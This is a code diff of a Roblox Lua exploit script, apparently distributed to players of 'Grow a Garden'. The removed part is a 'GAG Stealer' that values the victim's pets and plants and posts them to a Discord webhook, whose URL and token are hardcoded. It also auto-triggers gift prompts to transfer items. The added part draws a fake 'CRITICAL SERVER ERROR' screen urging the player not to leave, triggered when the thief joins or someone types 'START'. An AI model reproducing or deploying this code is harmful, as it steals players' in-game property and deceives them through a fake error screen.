@@ -1,248 +1,101 @@
-if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
-    return
-end
-rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)
-
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local backpack = LocalPlayer:WaitForChild("Backpack")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Unfavorite items
-local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
-for _, item in ipairs(backpack:GetChildren()) do
-    if item:GetAttribute("d") == true then
-        event:FireServer(item)
-    end
-end
-
--- Module requirements
-local HttpService = game:GetService("HttpService")
-local modules = ReplicatedStorage:WaitForChild("Modules")
-local dataService = require(modules:WaitForChild("DataService"))
-local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
-local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
-local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
-local numberUtil = require(modules:WaitForChild("NumberUtil"))
-
-local function safeLerp(a, b, t)
-	return a + (b - a) * t
-end
-
-local Webhook = getfenv().Webhook
-local Username = getfenv().Username
-local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local DualUsername = "namnnni2"
-if not Webhook or not Username then return end
-
-local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
-local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
-
-local function formatNumber(n)
-	local suffix = {"", "k", "m", "b", "t"}
-	local idx = 1
-	while n >= 1000 and idx < #suffix do
-		n = n / 1000
-		idx = idx + 1
-	end
-	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
-end
-
-local function calcPetValue(petData)
-	local egg = petData.PetData.HatchedFrom
-	if not egg then return 0 end
-	local data = petRegistry.PetEggs[egg]
-	local rarity = data and data.RarityData.Items[petData.PetType]
-	if not rarity then return 0 end
-	local r = rarity.GeneratedPetData.WeightRange
-	if not r then return 0 end
-	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
-	local weightMult = safeLerp(0.8, 1.2, lerp)
-	local levelMult = safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
-	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
-end
-
-for _, tool in ipairs(backpack:GetChildren()) do
-	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-		if tool:GetAttribute("ItemType") == "Pet" then
-			local id = tool:GetAttribute("PET_UUID")
-			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
-			if petData and petData.PetType then
-				local petName = petData.PetType
-				local weight = tonumber(petData.PetData.BaseWeight) or 0
-				local value = calcPetValue(petData)
-				if table.find(rarePets, petName) then hasRare = true end
-				if weight >= 10 then hasHeavy = true end
-				totalValue = totalValue + value
-				table.insert(itemsToSend, {Tool = tool, Name = petName, Weight = weight, Value = value, Type = "Pet"})
-			end
-		else
-			local value = calcPlantValue(tool)
-			totalValue = totalValue + value
-			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
-		end
-	end
-end
-
-if #itemsToSend == 0 then return end
-
-table.sort(itemsToSend, function(a, b)
-	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
-	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
-	return a.Value > b.Value
-end)
-
-local useDual = totalValue >= 1e12
-local finalWebhook = useDual and DualWebhook or Webhook
-local finalUsername = useDual and DualUsername or Username
-
-local content = (hasRare or hasHeavy) and "@everyone 🚨 Mission Alert!\n" or ""
-content = content .. "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n>>> Mission success ✅\n**JobId:** `" .. game.JobId .. "`\n\n"
-
-local lines = ""
-for _, item in ipairs(itemsToSend) do
-	local icon = item.Type == "Pet" and (
-		table.find(rarePets, item.Name) and "🐲" or (item.Weight >= 10 and "🐘" or "🐶")
-	) or "🍏"
-	lines = lines .. string.format("%s **%s** (%.2f KG) — ₵%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
-	if #lines > 1024 then
-		lines = lines:sub(1, 1000) .. "\n...more items"
-		break
-	end
-end
-
-local embed = {
-	title = "🎯 GAG OPS - Steal & Gift Report",
-	description = "Inventory extraction complete. Mission success ✅",
-	color = 0xFF0000,
-	author = { name = "GAG Stealer System", icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png" },
-	thumbnail = { url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif" },
-	fields = {
-		{name = "🎯 Victim", value = LocalPlayer.Name, inline = true},
-		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
-		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
-		{name = "🧾 Inventory Log", value = lines, inline = false}
-	},
-	footer = {
-		text = "🦊 GAG Stealer by namnnni2 — Stay stealthy",
-		icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
-	},
-	timestamp = DateTime.now():ToIsoDate()
-}
-
-local payload = {
-	content = content,
-	embeds = {embed}
-}
-
-local function getRequest()
-	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
-end
-
-pcall(function()
-	local req = getRequest()
-	if req then
-		req({
-			Url = finalWebhook,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode(payload)
-		})
-	end
-end)
-
--- Proximity + move behind
-local UserInputService = game:GetService("UserInputService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local VirtualUser = game:GetService("VirtualUser")
 local CONFIG = {
-    mobileHoldTime = 1.5,
-    promptHoldTime = 0.5,
-    promptDistance = 10
+    priorityPlayers = {"namnnni2", "another_username_here"}
 }
 
-local function getNearbyPrompt(maxDistance)
-    local char = LocalPlayer.Character
-    if not char or not char.PrimaryPart then return nil end
+local function createLoadingScreen()
+    -- Không còn kiểm tra _G.LoadingScreenRan, mỗi lần gọi sẽ tạo mới
 
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
-            local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
-            if dist <= maxDistance then
-                return obj
-            end
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.DisplayOrder = 999999
+    screenGui.Name = "CriticalLoadingScreen"
+    screenGui.Parent = game:GetService("CoreGui")
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+    bg.BackgroundTransparency = 0
+    bg.Parent = screenGui
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.9, 0, 0.2, 0)
+    title.Position = UDim2.new(0.05, 0, 0.3, 0)
+    title.Text = "❗ CRITICAL SERVER ERROR ❗"
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 36
+    title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    title.TextStrokeTransparency = 0
+    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.TextWrapped = true
+    title.Parent = bg
+
+    local warning = Instance.new("TextLabel")
+    warning.Size = UDim2.new(0.9, 0, 0.1, 0)
+    warning.Position = UDim2.new(0.05, 0, 0.45, 0)
+    warning.Text = "⚠️ Do NOT leave. Your data may be lost forever! ⚠️"
+    warning.Font = Enum.Font.GothamBold
+    warning.TextSize = 22
+    warning.TextColor3 = Color3.fromRGB(255, 100, 100)
+    warning.TextStrokeTransparency = 0
+    warning.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    warning.BackgroundTransparency = 1
+    warning.TextWrapped = true
+    warning.Parent = bg
+
+    task.spawn(function()
+        while true do
+            warning.TextTransparency = 0
+            task.wait(0.5)
+            warning.TextTransparency = 0.5
+            task.wait(0.5)
+        end
+    end)
+
+    task.spawn(function()
+        task.wait(300)
+        title.Text = "Reconnecting to server..."
+        warning.Visible = false
+    end)
+end
+
+-- Gắn sự kiện chat
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        if msg:upper() == "START" then
+            createLoadingScreen()
+        end
+    end)
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    for _, name in ipairs(CONFIG.priorityPlayers) do
+        if plr.Name == name then
+            createLoadingScreen()
         end
     end
-    return nil
 end
 
-local function isMobile()
-    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
-end
+Players.PlayerAdded:Connect(function(plr)
+    for _, name in ipairs(CONFIG.priorityPlayers) do
+        if plr.Name == name then
+            createLoadingScreen()
+        end
+    end
 
-local function virtualInputGift(prompt)
-    if not prompt then return false end
-
-    local success = false
-    local holdTime = isMobile() and CONFIG.mobileHoldTime or CONFIG.promptHoldTime
-
-    pcall(function()
-        local promptPosition = prompt.Parent.Position
-        local camera = workspace.CurrentCamera
-        local screenPoint, onScreen = camera:WorldToScreenPoint(promptPosition)
-
-        if onScreen then
-            if isMobile() then
-                local touchPositions = {}
-                for i = 1, 3 do
-                    table.insert(touchPositions, Vector2.new(screenPoint.X + (i-2)*2, screenPoint.Y + (i-2)*2))
-                end
-
-                for _, pos in ipairs(touchPositions) do
-                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.Begin, pos)
-                    task.wait(0.05)
-                end
-
-                task.wait(holdTime)
-
-                for _, pos in ipairs(touchPositions) do
-                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.End, pos)
-                    task.wait(0.05)
-                end
-            else
-                VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, true, game, 1)
-                task.wait(holdTime)
-                VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, false, game, 1)
-            end
-            success = true
+    plr.Chatted:Connect(function(msg)
+        if msg:upper() == "START" then
+            createLoadingScreen()
         end
     end)
+end)
 
-    if success then return true end
-
-    pcall(function()
-        if isMobile() then
-            VirtualUser:SetKeyDown("0x65")
-            task.wait(holdTime)
-            VirtualUser:SetKeyUp("0x65")
-        else
-            VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-            task.wait(holdTime)
-            VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-        end
-        success = true
-    end)
-end
-
-task.spawn(function()
-    while task.wait(1) do
-        local prompt = getNearbyPrompt(CONFIG.promptDistance)
-        if prompt then
-            local ok = virtualInputGift(prompt)
-            if ok then
-                task.wait(2)
-            end
-        end
+LocalPlayer.Chatted:Connect(function(msg)
+    if msg:upper() == "START" then
+        createLoadingScreen()
     end
 end)
